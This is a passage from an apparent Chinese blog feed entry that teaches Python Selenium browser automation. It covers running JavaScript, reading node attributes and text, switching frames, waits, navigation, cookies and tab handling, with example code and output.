class="string">"https://www.zhihu.com/explore"</span>)</span><br><span class="line">browser.execute<span class="constructor">_script('<span class="params">window</span>.<span class="params">scrollTo</span>(0,<span class="params">document</span>.<span class="params">body</span>.<span class="params">scrollHeight</span>)</span>')</span><br><span class="line">browser.execute<span class="constructor">_script('<span class="params">alert</span>(<span class="string">"To Bottom"</span>)</span>')</span><br></pre></td></tr></table></figure><br><img src="/img/python3/selenium5.png" alt="avatar"><br>这里就利用execute_script()方法将进度条下拉到最底部，然后弹出alert提示框</p><p>所以说有了这个方法，基本上API没有提供的所有功能都可以用执行JavaScript的方式来实现了</p><h4 id="获取节点信息"><a href="#获取节点信息" class="headerlink" title="获取节点信息"></a>获取节点信息</h4><p>前面通过Beautiful Soup,pyquery等提取信息</p><p>Selenium中提供了选择节点的方法，返回的是WebElement类型，那么它也有相关的方法和属性来直接提取节点信息，如属性，文本等。这样的话，我们就可以不用通过解析源代码来提取信息了</p><h5 id="获取属性"><a href="#获取属性" class="headerlink" title="获取属性"></a>获取属性</h5><p>我们可以通过get_attribute()方法来获取节点的属性，前提是先选中这个节点<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">url</span>=<span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.<span class="builtin-name">get</span>(url)</span><br><span class="line"><span class="attribute">logo</span>=browser.find_element_by_id('zh-top-link-logo')</span><br><span class="line"><span class="builtin-name">print</span>(logo)</span><br><span class="line"><span class="builtin-name">print</span>(logo.get_attribute(<span class="string">'class'</span>))</span><br></pre></td></tr></table></figure><br>通过get_attribute()方法，然后传入想要获取的属性名，就可以得到它的值了</p><h5 id="获取文本值"><a href="#获取文本值" class="headerlink" title="获取文本值"></a>获取文本值</h5><p>每个WebElement节点都有text属性，直接调用这个属性就可以得到节点内部的文本信息，这相当于Beautiful Soup中的get_text()方法，pyquery的text()方法<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">url</span>=<span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.<span class="builtin-name">get</span>(url)</span><br><span class="line"><span class="attribute">input</span>=browser.find_element_by_class_name('ExploreHomePage-ContentSection-header')</span><br><span class="line"><span class="builtin-name">print</span>(input.text)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">最新专题</span><br></pre></td></tr></table></figure><br>这样就获得了最新专题节点的内容</p><h5 id="获取id-位置，标签名和大小"><a href="#获取id-位置，标签名和大小" class="headerlink" title="获取id,位置，标签名和大小"></a>获取id,位置，标签名和大小</h5><p>WebElement节点还有一些其他的属性，比如id属性可以获取节点的id,location属性可以获取该节点在页面中的相对位置，tag_name属性可以获取标签名称，size属性可以获取节点的大小，也就是宽高<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">url</span>=<span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.<span class="builtin-name">get</span>(url)</span><br><span class="line"><span class="attribute">input</span>=browser.find_element_by_class_name('ExploreHomePage-ContentSection-header')</span><br><span class="line"><span class="builtin-name">print</span>(input.text)</span><br><span class="line"><span class="builtin-name">print</span>(input.id)</span><br><span class="line"><span class="builtin-name">print</span>(input.location)</span><br><span class="line"><span class="builtin-name">print</span>(input.tag_name)</span><br><span class="line"><span class="builtin-name">print</span>(input.size)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">最新专题</span><br><span class="line">b74d780d-b4f2-4a35-9221-cb40a5e48902</span><br><span class="line">&#123;<span class="string">'x'</span>: 10, <span class="string">'y'</span>: 84&#125;</span><br><span class="line">div</span><br><span class="line">&#123;<span class="string">'height'</span>: 36, <span class="string">'width'</span>: 1000&#125;</span><br></pre></td></tr></table></figure><br>这样就获取到了id,位置，标签名和大小</p><h4 id="切换Frame"><a href="#切换Frame" class="headerlink" title="切换Frame"></a>切换Frame</h4><p>网页中有一个节点叫做iframe，也就是子Frame，相当于页面中的子页面，它的结构和外部网页的结构完全一致。Selenium打开页面后，它默认是在父级Frame里操作，而此时如果页面中还有子Frame，它是不能获取到子Frame里面的节点的，这时就需要switch_to.frame()方法来切换Frame</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions import NoSuchElementException</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">url</span>=<span class="string">'http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable'</span></span><br><span class="line">browser.<span class="builtin-name">get</span>(url)</span><br><span class="line">browser.switch_to.frame(<span class="string">'iframeResult'</span>)</span><br><span class="line">try:</span><br><span class="line">    <span class="attribute">logo</span>=browser.find_element_by_class_name('logo')</span><br><span class="line">except NoSuchElementException:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"NO LOGO"</span>)</span><br><span class="line">browser.switch_to.parent_frame()</span><br><span class="line"><span class="attribute">logo</span>=browser.find_element_by_class_name('logo')</span><br><span class="line"><span class="builtin-name">print</span>(logo)</span><br><span class="line"><span class="builtin-name">print</span>(logo.text)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="literal">NO</span> LOGO</span><br><span class="line">&lt;selenium.webdriver.remote.webelement.WebElement (<span class="attribute">session</span>=<span class="string">"74a6a23d440b28de1d52cee1269b0ca6"</span>, <span class="attribute">element</span>=<span class="string">"909ba7c7-467d-4bb7-86aa-3df9d4981362"</span>)&gt;</span><br><span class="line">RUNOOB.COM</span><br></pre></td></tr></table></figure><p>首先通过switch_to.frame()方法切换到子Frame里面，然后尝试获取子Frame里的logo节点，如果找不到的话，就会抛出NoSuchElementException异常。接下来，重新切换到父级Frame,再次重新获取节点，就可以成功捕获了</p><h4 id="延时等待"><a href="#延时等待" class="headerlink" title="延时等待"></a>延时等待</h4><p>get()方法会在网页框架加载结束后结束执行，此时如果获取page_source,可能并不是浏览器完全加载完成的页面，如果某些页面有额外的Ajax请求，我们在网页源代码中也不一定能获取到。所以，这里需要延时等待一定时间，确保节点已经加载出来</p><h5 id="隐式等待"><a href="#隐式等待" class="headerlink" title="隐式等待"></a>隐式等待</h5><p>当使用隐式等待执行测试的时候，如果selenium没有在DOM中找到节点，将继续等待，超出设定时间后，则抛出找不到节点的异常。换句话说，当查找节点而节点并没有立即出现的时候，隐式等待将等待一段时间再查找DOM，默认事件为0<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.implicitly_wait(10)</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.zhihu.com/explore'</span>)</span><br><span class="line"><span class="attribute">input</span>=browser.find_element_by_class_name('ExploreHomePage-ContentSection-header')</span><br><span class="line"><span class="builtin-name">print</span>(input)</span><br></pre></td></tr></table></figure><br>这里使用了隐式等待implicitly_wait()</p><h5 id="显式等待"><a href="#显式等待" class="headerlink" title="显式等待"></a>显式等待</h5><p>隐式等待的效果其实并没有那么好，因为我们只规定了一个固定时间，而页面加载时间还会受到网络条件的影响</p><p>这里还有一种更合适的显式等待方法，它指定要查找的节点，然后指定一个最长等待时间。如果在规定时间内加载出来了节点，就返回查找的节点，反之</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by import By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui import WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support import expected_conditions as EC</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line"><span class="attribute">wait</span>=WebDriverWait(browser,10)</span><br><span class="line"><span class="attribute">input</span>=wait.until(EC.presence_of_element_located((By.ID,'q')))</span><br><span class="line"><span class="attribute">button</span>=wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'.btn-search')))</span><br><span class="line"><span class="builtin-name">print</span>(input,button)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;selenium.webdriver.remote.webelement.WebElement (<span class="attribute">session</span>=<span class="string">"8ed44db593e504803b1e1bbdaa40096f"</span>, <span class="attribute">element</span>=<span class="string">"2e6789ed-7862-419b-adca-2cea31a3d3c9"</span>)&gt; &lt;selenium.webdriver.remote.webelement.WebElement (<span class="attribute">session</span>=<span class="string">"8ed44db593e504803b1e1bbdaa40096f"</span>, <span class="attribute">element</span>=<span class="string">"4d2571b6-fd8d-47e2-8490-f6fddf96959b"</span>)&gt;</span><br></pre></td></tr></table></figure><p>首先引入WebDriverWait这个对象，指定最长等待时间，然后调用它的until()方法，传入要等待条件expected_conditions。比如，这里传入了presence_of_element_located这个条件，代表节点出现的意思，其参数是节点的定位元组，也就是ID为q的节点搜索框</p><p>这样可以做到的效果就是，在10秒内如果ID为q的节点成功加载出来，就返回该节点；如果超过10秒还没有加载出来，就抛出异常。</p><p>对于按钮，可以更改一下等待条件，比如改为element_to_be_clickable，也就是可点击，所以查找按钮时查找CSS选择器为.btn-search的按钮，如果10秒内它是可点击的，也就是成功加载出来了，就返回这个按钮节点，反之</p><p>更多操作请参考文档<br>中文文档：<br><a href="https://python-selenium-zh.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">https://python-selenium-zh.readthedocs.io/zh_CN/latest/</a><br>官方文档：<br><a href="https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement" target="_blank" rel="noopener">https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement</a></p><h4 id="前进和后退"><a href="#前进和后退" class="headerlink" title="前进和后退"></a>前进和后退</h4><p>平时使用浏览器时都有前进和后退功能，selenium也可以完成这个操作，它使用back()方法后退，使用forward()方法前进。<br><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">time</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.python.org'</span>)</span><br><span class="line">browser.back()</span><br><span class="line"><span class="type">time</span>.sleep(<span class="number">1</span>)</span><br><span class="line">browser.forward()</span><br><span class="line">browser.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure><br>这样我们连续访问3个页面，然后调用back方法回到第二个页面，接下来再调用forward()方法又可以前进到第三个页面</p><h4 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h4><p>使用selenium，还可以方便地对Cookies进行操作，例如获取，添加，删除Cookies等<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.zhihu.com/explore'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(browser.get_cookies())</span><br><span class="line">browser.add_cookie(&#123;<span class="string">'name'</span>:<span class="string">'name'</span>,<span class="string">'domain'</span>:<span class="string">'www.zhihu.com'</span>,<span class="string">'value'</span>:<span class="string">'germey'</span>&#125;)</span><br><span class="line"><span class="builtin-name">print</span>(browser.get_cookies())</span><br><span class="line">browser.delete_all_cookies()</span><br><span class="line"><span class="builtin-name">print</span>(browser.get_cookies())</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[&#123;<span class="string">'domain'</span>: <span class="string">'www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'KLBRSID'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'cdfcc1d45d024a211bb7144f66bda2cf|1587952898|1587952896'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1619488898, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'Hm_lvt_98beee57fd2ef70ccdd5ca52b9740c49'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'1587952898'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'Hm_lpvt_98beee57fd2ef70ccdd5ca52b9740c49'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'1587952898'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1682560896.073367, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'d_c0'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'"AIBbIT5rLhGPTpMVZJCLnmYZXYPvh8AXzpM=|1587952896"'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'SESSIONID'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'Ns5jG8TIaSE1aAjeOzckOayn6V6nDAubFTUf1DfCC2H'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'_xsrf'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'6e9342c2-b0fd-4474-9099-193fef3e5595'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1651024896.073016, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'_zap'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'2dbb5fb5-9f25-44ae-ac01-5183941f56df'</span>&#125;]</span><br><span class="line"></span><br><span class="line">[&#123;<span class="string">'domain'</span>: <span class="string">'.www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'name'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">True</span>, <span class="string">'value'</span>: <span class="string">'germey'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'KLBRSID'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'cdfcc1d45d024a211bb7144f66bda2cf|1587952898|1587952896'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1619488898, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'Hm_lvt_98beee57fd2ef70ccdd5ca52b9740c49'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'1587952898'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'Hm_lpvt_98beee57fd2ef70ccdd5ca52b9740c49'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'1587952898'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1682560896.073367, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'d_c0'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'"AIBbIT5rLhGPTpMVZJCLnmYZXYPvh8AXzpM=|1587952896"'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'SESSIONID'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'Ns5jG8TIaSE1aAjeOzckOayn6V6nDAubFTUf1DfCC2H'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'_xsrf'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'6e9342c2-b0fd-4474-9099-193fef3e5595'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1651024896.073016, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'_zap'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'2dbb5fb5-9f25-44ae-ac01-5183941f56df'</span>&#125;]</span><br><span class="line"></span><br><span class="line">[]</span><br></pre></td></tr></table></figure><br>可以看到我们添加的cookie被添加到了cookies中</p><h4 id="选项卡管理"><a href="#选项卡管理" class="headerlink" title="选项卡管理"></a>选项卡管理</h4><p>访问网页的时候，会开启一个个选项卡。在selenium中，我们可以对选项卡进行操作<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">browser.execute_script(<span class="string">'window.open()'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(browser.window_handles)</span><br><span class="line">browser.switch_to.window(browser.window_handles[1])</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">time.sleep(1)</span><br><span class="line">browser.switch_to.window(browser.window_handles[0])</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://python.org'</span>)</span><br></pre></td></tr></table></figure><br>先访问了百度，然后调用了execute_script()方法，这里传入window.open()这个JavaScript语句开启一个选项卡。然后用windows_handles属性获取当前开启地所有选项卡，返回的是选项卡的代码列表。想要切换，只需要使用switch_to.window()方法，其中是选项卡的代号即可。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.安装selenium之后，还需要根据浏览器的不同，安装对应的webdriver，例如Chrome的webdriver</p><p>2.webdriver需要放在浏览器的根目录中，并且在环境变量中引入，如果在管理员模式下cmd中，输入对应webdriver的名字，有正常显示就表示环境变量成功</p><p>3.如果需要通过python来对浏览器进行操作，还需要将对应的webdriver放入到python的根目录下</p><p>4.selenium可以操作浏览器自动完成一些操作，所以需要注意一些危险操作，以免操作信息泄露</p><p>5.selenium功能强大，可以使用动作链和节点交互功能完成一系列重复性操作，例如抢课等</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;动态渲染页面爬取&quot;&gt;&lt;a href=&quot;#动态渲染页面爬取&quot; class=&quot;headerlink&quot; title=&quot;动态渲染页面爬取&quot;&gt;&lt;/a&gt;动态渲染页面爬取&lt;/h1&gt;&lt;p&gt;前面了解到了Ajax的分析和爬取方式，这其实也是JavaScript动态渲染页面的一种方式，
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="Python3" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/Python3/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
</feed>
